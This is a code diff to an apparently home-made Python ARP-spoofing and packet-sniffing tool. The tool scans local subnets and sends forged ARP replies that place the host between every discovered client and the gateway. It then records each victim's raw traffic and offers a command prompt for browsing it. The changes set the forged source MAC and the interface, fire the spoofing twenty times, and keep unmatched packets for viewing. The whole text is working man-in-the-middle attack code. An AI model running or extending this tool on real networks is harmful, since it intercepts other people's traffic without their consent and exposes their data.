@@ -36,7 +36,7 @@ def get_mac_adress(bytes_addres):
     return mac_adress
 
 host_ip = socket.gethostbyname(socket.gethostname())
-host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
+host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big')).upper()
 gateway_ip = get_default_gateway_linux()
 gateway_mac = ''
 
@@ -261,18 +261,19 @@ def scan(net, interface, timeout=5):
     return ret
 
 class Client():
-    def __init__(self, ip, mac):
+    def __init__(self, ip, mac, interface = None):
+        self.interface = interface
         self.ip = ip
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
         self.packets = []
         self.arp_packets = 0
     def spoof(self):
-        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac), verbose=False)
-        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac), verbose=False)
+        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = host_mac), iface=self.interface, verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc = host_mac), iface=self.interface, verbose=False)
     def restore(self):
-        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
-        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
+        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), iface=self.interface, verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), iface=self.interface, verbose=False)
     def fire(self):
         try:
             self.spoof()
@@ -287,6 +288,7 @@ class IPtable():
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
         self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
+        self.unreg_packets = []
 
     def find(self, client):
         for i, c in enumerate(self.clients):
@@ -295,8 +297,12 @@ class IPtable():
         return -1
 
     def find_mac(self, mac):
-        for i, c in enumerate(self.clients):
-            if (c.mac == mac):
+        if (mac == gateway_mac):
+            return 1
+        if (mac == host_mac):
+            return 0
+        for i in range(len(self.clients)):
+            if (self.clients[i].mac == mac):
                 return i
         return -1
 
@@ -321,14 +327,15 @@ class IPtable():
             if net:
                 i = scan(net, interface)
                 for line in i:
-                    ips.append(line)
+                    ips.append([line[0], line[1], interface])
         for i in ips:
-            self.emplase(Client(i[1], i[0]))
+            self.emplase(Client(i[1], i[0], i[2]))
 
     def attack(self):
         for client in self.clients:
             if (client.type == False):
-                client.fire()
+                for i in range(20):
+                    client.fire()
 
     def restore(self):
         for client in self.clients:
@@ -336,12 +343,14 @@ class IPtable():
                 client.restore()
 
     def insert_packet(self, packet):
-        client_id = self.find_mac(packet.dest_mac)
+        client_id = self.find_mac(packet.source_mac)
         if (client_id != -1):
-            if (packet.type == 'ARP_packet'):
-                self.clients[client_id].arp_packets += 1
-            else:
-                self.clients[client_id].packets.append(packet)
+            #if (packet.type == 'ARP_packet'):
+            #    self.clients[client_id].arp_packets += 1
+            #else:
+            self.clients[client_id].packets.append(packet)
+        else:
+            self.unreg_packets.append(packet)
 
 
 def sniff(Ips):
@@ -350,22 +359,15 @@ def sniff(Ips):
         Seg = factory(raw_data)
         Ips.insert_packet(Seg)
 
-def attack(Ips):
-    for i in range(20):
-        Ips.attack()
-        time.sleep(1)
-
 
 if __name__ == '__main__':
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-    gateway_mac = get_mac(gateway_ip)
+    gateway_mac = get_mac(gateway_ip).upper()
     Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
     Ips.scan()
-    #main(Ips)
     th_sniff = threading.Thread(target=sniff, args=(Ips, ), daemon=True)
     th_sniff.start()
-    th_attack = threading.Thread(target=attack, args=(Ips,), daemon=True)
-    th_attack.start()
+    Ips.attack()
     command = ''
     while (command != 'exit'):
         command = input('input command: ')
@@ -375,14 +377,18 @@ if __name__ == '__main__':
             print("print 'exit' to exit")
         if command == 'ips':
             for i in Ips.clients:
-                print(i.ip)
+                print(i.ip, i.mac)
         if command == 'packets':
             for i in range(len(Ips.clients)):
                 print(i + 1, Ips.clients[i].ip, len(Ips.clients[i].packets))
             a = ""
-            while(a != 'back' and (a.isdigit() == False or (int(a) < 1 and int(a) > len(Ips.clients)))):
+            while(a != 'other' and a != 'back' and (a.isdigit() == False or (int(a) < 1 and int(a) > len(Ips.clients)))):
                 a = input('choose target ip:')
             if a == 'back':
+                continue
+            if a == 'other':
+                for i in Ips.unreg_packets:
+                    i.print_values()
                 continue
             a = int(a) - 1
             for i in Ips.clients[a].packets:
